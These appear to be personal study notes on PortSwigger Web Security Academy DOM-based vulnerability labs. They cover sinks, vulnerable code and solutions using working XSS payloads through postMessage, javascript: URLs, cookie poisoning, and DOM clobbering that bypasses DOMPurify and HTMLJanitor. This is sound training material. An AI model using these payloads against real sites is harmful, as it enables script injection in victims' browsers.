## DOM-based

https://portswigger.net/web-security/dom-based

https://portswigger.net/web-security/dom-based/controlling-the-web-message-source

https://portswigger.net/web-security/dom-based/dom-clobbering

#### Which sinks can lead to DOM-based vulnerabilities?

The following list provides a quick overview of common  DOM-based vulnerabilities and an example of a sink that can lead to each one. For a more comprehensive list of relevant sinks, please refer to  the vulnerability-specific pages by clicking the links below.        

| DOM-based vulnerability                                      | Example sink                                                 |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) | `                        document.write()                    ` |
| [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection) | `                        window.location                    ` |
| [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation) | `                        document.cookie                    ` |
| [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection) | `                        eval()                    `         |
| [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation) | `                        document.domain                    ` |
| [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning) | `                        WebSocket()                    `    |
| [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation) | `                        element.src                    `    |
| [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation) | `                        postMessage()                    `  |
| [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation) | `                        setRequestHeader()                    ` |
| [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation) | `                        FileReader.readAsText()                    ` |
| [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection) | `                        ExecuteSql()                    `   |
| [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation) | `                        sessionStorage.setItem()                    ` |
| [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection) | `                        document.evaluate()                    ` |
| [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection) | `                        JSON.parse()                    `   |
| [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation) | `                        element.setAttribute()                    ` |
| [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service) | `                        RegExp()                    `       |



#### DOM XSS using web messages

> This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called. 

Vulnerable code

```javascript
<script>
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
</script>
```

exploit

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 1;
        z-index: 1;
    }
</style>
<iframe src="https://0a1a00ae04a69bd4c0da62eb008700f1.web-security-academy.net" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
				<ol>
					<li>
						Notice that the home page contains an <code>addEventListener()</code> call that listens for a web message.
					</li>
					<li>
						<p>
                            Go to the exploit server and add the following <code>iframe</code> to the body. Remember to add your own lab ID:
                        </p>
					<code class="code-scrollable">&lt;iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('&lt;img src=1 onerror=print()&gt;','*')"&gt;</code>
					</li>
					<li>
						Store the exploit and deliver it to the victim.
					</li>
				</ol>
				<p>
					When the <code>iframe</code> loads, the <code>postMessage()</code> method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the <code>div</code> with the ID <code>ads</code>. However, in this case it inserts our <code>img</code> tag, which contains an invalid <code>src</code> attribute. This throws an error, which causes the <code>onerror</code> event handler to execute our payload.
				</p>
			</div>
        </div>


#### DOM XSS using web messages and a JavaScript URL

> This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function. 

Vulnerable code

```javascript
<script>
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
</script>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
				<ol>
					<li>
						Notice that the home page contains an <code>addEventListener()</code> call that listens for a web message. The JavaScript contains a flawed <code>indexOf()</code> check that looks for the strings <code>"http:"</code> or <code>"https:"</code> anywhere within the web message. It also contains the sink <code>location.href</code>.
					</li>
					<li>
						<p>
							Go to the exploit server and add the following <code>iframe</code> to the body, remembering to replace <code>your-lab-id</code> with your lab ID:
						</p>
						<code class="code-scrollable">&lt;iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"&gt;</code>
					</li>
					<li>
						Store the exploit and deliver it to the victim.
					</li>
				</ol>
			<p>
				This script sends a web message containing an arbitrary JavaScript payload, along with the string <code>"http:"</code>. The second argument specifies that any <code>targetOrigin</code> is allowed for the web message.
			</p>
			<p>
				When the <code>iframe</code> loads, the <code>postMessage()</code> method sends the JavaScript payload to the main page. The event listener spots the <code>"http:"</code> string and proceeds to send the payload to the <code>location.href</code> sink, where the <code>print()</code> function is called.
			</p>
			</div>
        </div>


exploit

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 1;
        z-index: 1;
    }
</style>
<iframe src="https://0a5500f5030fdb0ec0ae430a00e300fa.web-security-academy.net" onload="this.contentWindow.postMessage('javascript:print()//http://123','*')">
```



#### DOM XSS using web messages and JSON.parse

> This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function. 

Vulnerable code

```javascript
<script>
                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
</script>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
				<ol>
					<li>
						Notice that the home page contains an event listener that listens for a web message. This event listener expects a string that is parsed using <code>JSON.parse()</code>. In the JavaScript, we can see that the event listener expects a <code>type</code> property and that the <code>load-channel</code> case of the <code>switch</code> statement changes the <code>iframe src</code> attribute.
					</li>
					<li>
						<p>
							Go to the exploit server and add the following <code>iframe</code> to the body, remembering to replace <code>your-lab-id</code> with your lab ID:
						</p>
						<code class="code-scrollable">&lt;iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'&gt;</code>
					</li>
					<li>
						Store the exploit and deliver it to the victim.
					</li>
				</ol>
				<p>
					When the <code>iframe</code> we constructed loads, the <code>postMessage()</code> method sends a web message to the home page with the type <code>load-channel</code>. The event listener receives the message and parses it using <code>JSON.parse()</code> before sending it to the <code>switch</code>.
				</p>
				<p>
					The <code>switch</code> triggers the <code>load-channel</code> case, which assigns the <code>url</code> property of the message to the <code>src</code> attribute of the <code>ACMEplayer.element</code> <code>iframe</code>. However, in this case, the <code>url</code> property of the message actually contains our JavaScript payload.
				</p>
				<p>
					As the second argument specifies that any <code>targetOrigin</code> is allowed for the web message, and the event handler does not contain any form of origin check, the payload is set as the <code>src</code> of the <code>ACMEplayer.element</code> <code>iframe</code>. The <code>print()</code> function is called when the victim loads the page in their browser.
				</p>
			</div>
        </div>


exploit

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 1;
        z-index: 1;
    }
</style>
<iframe src="https://0a1500db042d7768c000316300a900fc.web-security-academy.net" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```



#### DOM-based open redirection

> This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server. 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
				<p>
					The blog post page contains the following link, which returns to the home page of the blog:
				</p>
				<code class="code-scrollable">&lt;a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'&gt;Back to Blog&lt;/a&gt;</code>
				<p>
					The <code>url</code> parameter contains an open redirection vulnerability that allows you to change where the "Back to Blog" link takes the user. To solve the lab, construct and visit the following URL, remembering to change the URL to contain your lab ID and your exploit-server ID:
				</p>
				<code class="code-scrollable">https://your-lab-id.web-security-academy.net/post?postId=4&amp;url=https://your-exploit-server-id.web-security-academy.net/</code>
			</div>
        </div>

#### DOM-based cookie manipulation

> This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages. 

Vulnerable code

```javascript
<script>
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>

......

<a href="https://0aec00340395b0ecc029894a00540068.web-security-academy.net/product?productId=1">Last viewed product</a>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
				<ol>
					<li>
						Notice that the home page uses a client-side cookie called <code>lastViewedProduct</code>, whose value is the URL of the last product page that the user visited.
					</li>
					<li>
						<p>
                            Go to the exploit server and add the following <code>iframe</code> to the body, remembering to replace <code>your-lab-id</code> with your lab ID:
                        </p>
						<code class="code-scrollable">&lt;iframe src="https://your-lab-id.web-security-academy.net/product?productId=1&amp;'&gt;&lt;script&gt;print()&lt;/script&gt;" onload="if(!window.x)this.src='https://your-lab-id.web-security-academy.net';window.x=1;"&gt;</code>
					</li>
					<li>
					Store the exploit and deliver it to the victim.
					</li>
				</ol>
				<p>
					The original source of the <code>iframe</code> matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the <code>iframe</code> loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the <code>lastViewedProduct</code> cookie. The <code>onload</code> event handler ensures that the victim is then immediately redirected to the home page, unaware that this manipulation ever took place. While the victim's browser has the poisoned cookie saved, loading the home page will cause the payload to execute.
				</p>
			</div>
        </div>

exploit

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 1;
        z-index: 1;
    }
</style>
<iframe src="https://0aec00340395b0ecc029894a00540068.web-security-academy.net/product?productId=1#'/><script>print()</script>" onload="if(!window.x)this.src='https://0aec00340395b0ecc029894a00540068.web-security-academy.net';window.x=1;">
</iframe>
```



#### Exploiting DOM clobbering to enable XSS

> This lab contains a DOM-clobbering vulnerability. The comment functionality allows "safe" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the alert() function. 

Vulnerable code

```html
<span id="user-comments">
                    <script src="resources/js/domPurify-2.0.15.js"></script>
                    <script src="resources/js/loadCommentsWithDomClobbering.js"></script>
                    <script>loadComments('/post/comment')</script>
...
</span>
```

loadCommentsWithDomClobbering.js

```javascript
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();

    function escapeHTML(data) {
        return data.replace(/[<>'"]/g, function(c){
            return '&#' + c.charCodeAt(0) + ';';
        })
    }

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");

            let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
            let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';

            let divImgContainer = document.createElement("div");
            divImgContainer.innerHTML = avatarImgHTML

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + DOMPurify.sanitize(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }
......
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        <p>
                            Go to one of the blog posts and create a comment containing the following anchors:
                        </p>
						<code class="code-scrollable">&lt;a id=defaultAvatar&gt;&lt;a id=defaultAvatar name=avatar href="cid:&amp;quot;onerror=alert(1)//"&gt;</code>
                    </li>
					<li>
						Return to the blog post and create a second comment containing any random text. The next time the page loads, the <code>alert()</code> is called.
					</li>
                </ol>
				<p>
					The page for a specific blog post imports the JavaScript file <code>loadCommentsWithDomPurify.js</code>, which contains the following code:
                </p>
				<code class="code-scrollable">let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}</code>
				<p>
					The <code>defaultAvatar</code> object is implemented using this dangerous pattern containing the logical <code>OR</code> operator in conjunction with a global variable. This makes it vulnerable to DOM clobbering.
				</p>
				<p>
					You can clobber this object using anchor tags. Creating two anchors with the same ID causes them to be grouped in a DOM collection. The <code>name</code> attribute in the second anchor contains the value <code>"avatar"</code>, which will clobber the <code>avatar</code> property with the contents of the <code>href</code> attribute.
				</p>
				<p>
					Notice that the site uses the DOMPurify filter in an attempt to reduce DOM-based vulnerabilities. However, DOMPurify allows you to use the <code>cid:</code> protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. As a result, the injection described above will cause the <code>defaultAvatar</code> variable to be assigned the clobbered property <code>{avatar: ‘cid:"onerror=alert(1)//’}</code> the next time the page is loaded.
				</p>
				<p>
					When you make a second post, the browser uses the newly-clobbered global variable, which smuggles the payload in the <code>onerror</code> event handler and triggers the <code>alert()</code>.
				</p>				
            </div>
        </div>



#### Clobbering DOM attributes to bypass HTML filters

> This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls the print() function. You may need to use the exploit server in order to make your vector auto-execute in the victim's browser.

htmlJanitor.js

```javascript
(function (root, factory) {
  if (typeof define === 'function' && define.amd) {
    define('html-janitor', factory);
  } else if (typeof exports === 'object') {
    module.exports = factory();
  } else {
    root.HTMLJanitor = factory();
  }
}(this, function () {

  /**
   * @param {Object} config.tags Dictionary of allowed tags.
   * @param {boolean} config.keepNestedBlockElements Default false.
   */
  function HTMLJanitor(config) {

    var tagDefinitions = config['tags'];
    var tags = Object.keys(tagDefinitions);

    var validConfigValues = tags
      .map(function(k) { return typeof tagDefinitions[k]; })
      .every(function(type) { return type === 'object' || type === 'boolean' || type === 'function'; });

    if(!validConfigValues) {
      throw new Error("The configuration was invalid");
    }

    this.config = config;
  }

  var blockElementNames = ['P', 'LI', 'TD', 'TH', 'DIV', 'H1', 'H2', 'H3', 'H4', 'H5', 'H6', 'PRE'];
  function isBlockElement(node) {
    return blockElementNames.indexOf(node.nodeName) !== -1;
  }

  var inlineElementNames = ['A', 'B', 'STRONG', 'I', 'EM', 'SUB', 'SUP', 'U', 'STRIKE'];
  function isInlineElement(node) {
    return inlineElementNames.indexOf(node.nodeName) !== -1;
  }

  HTMLJanitor.prototype.clean = function (html) {
    const sandbox = document.implementation.createHTMLDocument('');
    const root = sandbox.createElement("div");
    root.innerHTML = html;

    this._sanitize(sandbox, root);

    return root.innerHTML;
  };

  HTMLJanitor.prototype._sanitize = function (document, parentNode) {
    var treeWalker = createTreeWalker(document, parentNode);
    var node = treeWalker.firstChild();

......

}));
```

loadCommentsWithHtmlJanitor.js

```javascript
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();
    let janitor = new HTMLJanitor({tags: {input:{name:true,type:true,value:true},form:{id:true},i:{},b:{},p:{}}});

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");

            let avatarImgElement = document.createElement("img");
            avatarImgElement.setAttribute("class", "avatar");
            avatarImgElement.setAttribute("src", comment.avatar ? comment.avatar : "/resources/images/avatarDefault.svg");

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + janitor.clean(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }
......
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
						<p>
                            Go to one of the blog posts and create a comment containing the following HTML:
                        </p>
						<code class="code-scrollable">&lt;form id=x tabindex=0 onfocus=print()&gt;&lt;input id=attributes&gt;</code>
					</li>
					<li>
                        <p>
                            Go to the exploit server and add the following <code>iframe</code> to the body:
                        </p>
						<code class="code-scrollable">&lt;iframe src=https://your-lab-id.web-security-academy.net/post?postId=3 onload="setTimeout(()=&gt;this.src=this.src+'#x',500)"&gt;</code>
                        <p>
                            Remember to change the URL to contain your lab ID and make sure that the <code>postId</code> parameter matches the <code>postId</code> of the blog post into which you injected the HTML in the previous step.
                        </p>
					</li>
					<li>
						Store the exploit and deliver it to the victim. The next time the page loads, the <code>print()</code> function is called.
					</li>
				</ol>
				<p>
					The library uses the <code>attributes</code> property to filter HTML attributes. However, it is still possible to clobber the <code>attributes</code> property itself, causing the length to be undefined. This allows us to inject any attributes we want into the <code>form</code> element. In this case, we use the <code>onfocus</code> attribute to smuggle the <code>print()</code> function.
				</p>
				<p>
					When the <code>iframe</code> is loaded, after a 500ms delay, it adds the <code>#x</code> fragment to the end of the page URL. The delay is necessary to make sure that the comment containing the injection is loaded before the JavaScript is executed. This causes the browser to focus on the element with the ID <code>"x"</code>, which is the form we created inside the comment. The <code>onfocus</code> event handler then calls the <code>print()</code> function.
				</p>
			</div>
        </div>

